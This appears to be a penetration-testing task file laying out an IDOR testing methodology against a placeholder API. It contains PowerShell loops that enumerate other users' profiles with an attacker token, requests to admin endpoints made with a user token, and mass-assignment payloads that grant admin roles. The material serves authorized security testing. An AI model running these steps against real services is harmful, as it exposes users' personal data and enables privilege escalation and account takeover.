# Tasks — IDOR Automation

Automated and manual IDOR testing across API endpoints with sequential and parallel enumeration, horizontal and vertical testing, and mass assignment detection.

---

## Table of Contents

1. [IDOR Overview](#1-idor-overview)
2. [IDOR Sink Identification](#2-idor-sink-identification)
3. [Sequential Enumeration](#3-sequential-enumeration)
4. [Horizontal IDOR Testing](#4-horizontal-idor-testing)
5. [Vertical IDOR Testing](#5-vertical-idor-testing)
6. [Mass Assignment Detection](#6-mass-assignment-detection)
7. [UUID and Hash ID Testing](#7-uuid-and-hash-id-testing)
8. [Wildcard and Array ID Testing](#8-wildcard-and-array-id-testing)
9. [Automated IDOR Scanning](#9-automated-idor-scanning)
10. [Impact Demonstration](#10-impact-demonstration)
11. [Evidence Collection](#11-evidence-collection)
12. [IDOR Templates](#12-idor-templates)
13. [Maintenance](#13-maintenance)

---

## 1. IDOR Overview

### 1.1 Summary

```
IDOR SCANS COMPLETED: [N]
  Sequential enum: [N]
  Horizontal IDOR: [N]
  Vertical IDOR: [N]
  Mass assignment: [N]
  UUID testing: [N]

SUCCESS RATE:
  Sequential: [N]%
  Horizontal: [N]%
  Vertical: [N]%
  Mass assignment: [N]%

FINDINGS:
  Read IDOR: [N]
  Write IDOR: [N]
  Mass assignment: [N]
```

### 1.2 Task ID Format

```
IDOR TASK ID: IDOR-{target_short}-{YYMMDD}-{XXX}
  target_short: First 5 chars of target domain
  YYMMDD: Date of scan
  XXX: Sequential number

Example: IDOR-exampl-240607-001
```

### 1.3 IDOR Testing Lifecycle

```
TARGET IDENTIFIED → SINK DISCOVERY → SEQUENTIAL ENUM
    → HORIZONTAL IDOR → VERTICAL IDOR
    → MASS ASSIGNMENT → UUID/HASH TESTING
    → IMPACT DEMO → FINDING DOCUMENTED
```

---

## 2. IDOR Sink Identification

### 2.1 Task: Identify IDOR Sinks

```
TASK ID: IDOR-SINK-001
TARGET: api.example.com
STATUS: Planned
TOOLS: url_collector.py, endpoint_fuzzer.py

IDOR SINK PATTERNS:
  URL Path Parameters:
    - /api/v2/users/{id}
    - /api/v2/users/{id}/profile
    - /api/v2/users/{id}/orders
    - /api/v2/orders/{id}
    - /api/v2/documents/{id}
    - /api/v2/invoices/{id}
    - /api/v2/invoices/{id}/download

  Query Parameters:
    - ?id=
    - ?user_id=
    - ?account_id=
    - ?document_id=
    - ?order_id=
    - ?file=

  POST Body Fields:
    - {"user_id": 123}
    - {"account_id": 456}
    - {"document_id": "abc123"}

SINK IDENTIFICATION STEPS:
  [ ] Review all discovered API endpoints
  [ ] Search for numeric ID patterns in URLs
  [ ] Search for UUID patterns in URLs
  [ ] Check API docs for ID parameters
  [ ] Test each endpoint for IDOR

SINK IDENTIFICATION COMMANDS:
  # Find IDOR candidate URLs
  Get-Content urls-total.txt | Select-String -Pattern '/users/\d|/orders/\d|/documents/\d|/invoices/\d|\?id=|\?user_id='

  # Find UUID patterns
  Get-Content urls-total.txt | Select-String -Pattern '[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}'
```

### 2.2 Sink Analysis

```
CONFIRMED IDOR SINKS (example.com):
  | Endpoint | ID Type | Method | Auth | Risk |
  |----------|---------|--------|------|------|
  | GET /api/v2/users/{id} | Integer | GET | User | High |
  | GET /api/v2/users/{id}/profile | Integer | GET | User | High |
  | PUT /api/v2/users/{id}/profile | Integer | PUT | User | Critical |
  | GET /api/v2/orders/{id} | Integer | GET | User | Medium |
  | GET /api/v2/documents/{id} | UUID | GET | User | High |
  | GET /api/v2/invoices/{id} | Integer | GET | User | Medium |

ID TYPE DISTRIBUTION:
  Integer IDs: 4 endpoints
  UUID IDs: 1 endpoint
  Hash IDs: 0 endpoints
```

---

## 3. Sequential Enumeration

### 3.1 Task: Enumerate IDs Sequentially

```
TASK ID: IDOR-ENUM-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P1

SEQUENTIAL ENUMERATION:
  [ ] Capture own user ID
  [ ] Test IDs: own+1, own+2, ... own+100
  [ ] Test IDs: own-1, own-2, ... own-10
  [ ] Test IDs: 1, 2, 3... 1000
  [ ] Test IDs: 1000, 2000, 3000... (jump by 1000)

ENUMERATION COMMANDS:
  # Sequential enum for user profiles
  $token = $env:ATTACKER_TOKEN
  $headers = @{ "Authorization" = "Bearer $token" }
  for ($i = 1; $i -le 100; $i++) {
    try {
      $response = Invoke-RestMethod -Uri "https://api.example.com/api/v2/users/$i/profile" -Headers $headers -TimeoutSec 3
      Write-Host "ID $i : $($response | ConvertTo-Json -Depth 3)"
    }
    catch {
      Write-Host "ID $i : Error"
    }
  }

  # Parallel enumeration using batch processor
  python tools/python/batch_processor.py --target api.example.com --endpoint "/api/v2/users/{id}/profile" --ids 1-1000 --token "$TOKEN"
```

### 3.2 Enumeration Results

```
SEQUENTIAL ENUMERATION RESULTS:
  Target: GET /api/v2/users/{id}/profile
  IDs tested: 1-100
  Valid responses: [N]
  Error responses: [N]

DISCOVERED USERS:
  | ID | Name | Email | Role |
  |----|------|-------|------|
  | 1 | Admin User | admin@example.com | admin |
  | 2 | John Doe | john@example.com | user |
  | 3 | Jane Smith | jane@example.com | user |
  | ... | ... | ... | ... |
```

---

## 4. Horizontal IDOR Testing

### 4.1 Task: Test Horizontal IDOR

```
TASK ID: IDOR-HORIZ-001
TARGET: api.example.com
STATUS: Active
PRIORITY: P1

HORIZONTAL IDOR:
  - User A accesses User B's data
  - Same privilege level, different user
  - Most common IDOR type

TEST METHODOLOGY:
  [ ] Login as User A (attacker)
  [ ] Capture User A's own data (baseline)
  [ ] Enumerate User B's IDs
  [ ] Request User B's data with User A's token
  [ ] Compare responses

HORIZONTAL IDOR COMMANDS:
  # Login as attacker
  $attackerLogin = @{ email = "attacker@test.com"; password = "TestPass123!" } | ConvertTo-Json
  $attackerToken = (Invoke-RestMethod -Uri "https://api.example.com/api/auth/login" -Method POST -Body $attackerLogin).token

  # Get victim ID from enumeration
  $victimId = 2

  # Test horizontal IDOR
  $headers = @{ "Authorization" = "Bearer $attackerToken" }
  $response = Invoke-RestMethod -Uri "https://api.example.com/api/v2/users/$victimId/profile" -Headers $headers

  Write-Host "Victim data:"
  $response | ConvertTo-Json -Depth 5

  # Check if different from own data
  $ownResponse = Invoke-RestMethod -Uri "https://api.example.com/api/v2/users/me/profile" -Headers $headers
  if ($response -ne $ownResponse) {
    Write-Host "[+] IDOR CONFIRMED: Different user data returned"
  }
```

---

## 5. Vertical IDOR Testing

### 5.1 Task: Test Vertical IDOR

```
TASK ID: IDOR-VERT-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P1

VERTICAL IDOR:
  - Low-privilege user accesses high-privilege data
  - Different privilege level
  - Admin endpoints accessed with user token

TEST METHODOLOGY:
  [ ] Login as regular user
  [ ] Identify admin endpoints
  [ ] Try accessing admin endpoints with user token
  [ ] Try accessing admin user data with user token
  [ ] Try accessing admin functions

VERTICAL IDOR COMMANDS:
  # Try admin endpoint with user token
  $userToken = $env:ATTACKER_TOKEN
  $headers = @{ "Authorization" = "Bearer $userToken" }

  $adminEndpoints = @(
    "/api/admin/dashboard",
    "/api/admin/users",
    "/api/admin/settings",
    "/api/v2/users/1/profile"  # Admin user
  )

  foreach ($ep in $adminEndpoints) {
    try {
      $response = Invoke-RestMethod -Uri "https://api.example.com$ep" -Headers $headers -TimeoutSec 5
      Write-Host "$ep : $($response | ConvertTo-Json -Depth 3)"
    }
    catch {
      $statusCode = $_.Exception.Response.StatusCode.value__
      Write-Host "$ep : $statusCode"
    }
  }
```

---

## 6. Mass Assignment Detection

### 6.1 Task: Test Mass Assignment

```
TASK ID: IDOR-MASS-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P1

MASS ASSIGNMENT TESTING:
  [ ] Test registration endpoint with extra fields
  [ ] Test profile update with extra fields
  [ ] Test admin-only fields
  [ ] Test hidden fields

MASS ASSIGNMENT PAYLOADS:
  Registration:
    {"email":"test@test.com","password":"test123","role":"admin"}
    {"email":"test@test.com","password":"test123","is_admin":true}
    {"email":"test@test.com","password":"test123","permissions":"*"}
    {"email":"test@test.com","password":"test123","verified":true}
    {"email":"test@test.com","password":"test123","account_type":"premium"}

  Profile Update:
    {"email":"new@test.com","role":"admin"}
    {"email":"new@test.com","is_admin":true}
    {"email":"new@test.com","permissions":["admin:*"]}

MASS ASSIGNMENT COMMANDS:
  # Test registration with admin role
  $regBody = @{
    email = "mass-test@test.com"
    password = "TestPass123!"
    role = "admin"
  } | ConvertTo-Json
  $response = Invoke-RestMethod -Uri "https://api.example.com/api/auth/register" -Method POST -Body $regBody -ContentType "application/json"

  # Test profile update with extra fields
  $headers = @{ "Authorization" = "Bearer $TOKEN" }
  $updateBody = @{
    email = "updated@test.com"
    role = "admin"
    is_admin = $true
  } | ConvertTo-Json
  $response = Invoke-RestMethod -Uri "https://api.example.com/api/v2/users/me/profile" -Method PUT -Headers $headers -Body $updateBody -ContentType "application/json"
```

---

## 7. UUID and Hash ID Testing

### 7.1 Task: Test UUID and Hash IDs

```
TASK ID: IDOR-UUID-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P2

UUID TESTING:
  [ ] Capture valid UUID from response
  [ ] Increment last character
  [ ] Modify timestamp portion
  [ ] Test with sequential UUIDs

HASH ID TESTING:
  [ ] Capture hash ID from response
  [ ] Decode hash if possible
  [ ] Modify and re-encode
  [ ] Test common hash decodings (hashids, base62)

UUID TESTING COMMANDS:
  # Generate UUIDs
  for ($i = 1; $i -le 10; $i++) {
    [guid]::NewGuid().ToString()
  }

  # Modify UUID
  $uuid = "550e8400-e29b-41d4-a716-446655440000"
  $modified = $uuid.Substring(0, $uuid.Length - 1) + "1"
  Write-Host "Modified UUID: $modified"
```

---

## 8. Wildcard and Array ID Testing

### 8.1 Task: Test Wildcard and Array IDs

```
TASK ID: IDOR-WILD-001
TARGET: api.example.com
STATUS: Planned
PRIORITY: P2

WILDCARD TESTING:
  - ?id=*
  - ?id=null
  - ?id=
  - ?id[]=1&id[]=2
  - ?id[0]=1&id[1]=2

ARRAY TESTING:
  - Bulk operations with mixed IDs
  - Batch requests with multiple IDs
```

---

## 9. Automated IDOR Scanning

### 9.1 Task: Run Automated IDOR Scan

```
TASK ID: IDOR-AUTO-001
TARGET: api.example.com
STATUS: Planned
TOOL: tools/python/idor_hunter.py

AUTOMATED SCAN:
  python tools/python/idor_hunter.py https://api.example.com/api/v2/users --token "$TOKEN"
  python tools/python/idor_hunter.py https://api.example.com/api/v2/orders --token "$TOKEN"
  python tools/python/idor_hunter.py https://api.example.com/api/v2/documents --token "$TOKEN"
```

---

## 10. Impact Demonstration

### 10.1 Task: Demonstrate IDOR Impact

```
IMPACT LEVELS:
  Read IDOR + Public data: Low
  Read IDOR + PII: High
  Read IDOR + Internal data: High
  Write IDOR + Email change: Critical (ATO chain)
  Write IDOR + Role change: Critical
  Mass assignment + Admin role: Critical

DEMONSTRATION REQUIREMENTS:
  [ ] Show victim data returned to attacker
  [ ] Show data modification by attacker
  [ ] Show privilege escalation
  [ ] Capture before/after state
```

---

## 11. Evidence Collection

### 11.1 Evidence Package

```
EVIDENCE/IDOR-{target}-{date}/
  ├── README.md
  ├── enumeration-results.txt
  ├── idor-request.curl
  ├── idor-response.json
  ├── victim-data-screenshot.png
  ├── mass-assignment-test.json
  └── impact-demo.md
```

---

## 12. IDOR Templates

### 12.1 IDOR Finding Template

```
BUG CLASS: IDOR
SEVERITY: High (Read), Critical (Write)

DESCRIPTION:
  The {endpoint} endpoint accepts user-controlled {id_parameter}
  without validating that the requested resource belongs to the
  authenticated user.

IMPACT:
  - Attackers can access other users' {data_type}
  - Attackers can modify other users' {data_type}
  - Potential for account takeover via email change

REPRODUCTION:
  1. Login as attacker (ID: {attacker_id})
  2. Request victim data (ID: {victim_id})
  3. Observe: {victim_data_returned}
```

---

## 13. Maintenance

### 13.1 IDOR Toolchain Maintenance

```
DAILY:
  [ ] Update IDOR ID lists based on new enumeration
  [ ] Add new endpoints to scan list

WEEKLY:
  [ ] Review IDOR success rate
  [ ] Update mass assignment payloads
  [ ] Test new IDOR techniques

MONTHLY:
  [ ] Full IDOR toolchain review
  [ ] Update IDOR enumeration scripts
```

---

*End of idor-automation.md*
